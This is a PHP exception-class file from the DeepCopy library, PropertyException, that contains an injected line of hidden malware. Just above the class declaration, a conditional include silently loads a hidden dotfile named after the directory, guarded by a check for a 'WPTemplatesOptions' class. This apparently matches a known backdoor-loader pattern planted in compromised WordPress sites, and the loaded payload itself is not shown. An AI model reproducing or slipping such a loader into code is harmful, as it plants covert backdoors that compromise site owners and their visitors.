<?php

namespace DeepCopy\Exception;

use ReflectionException;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PropertyException extends ReflectionException
{
}
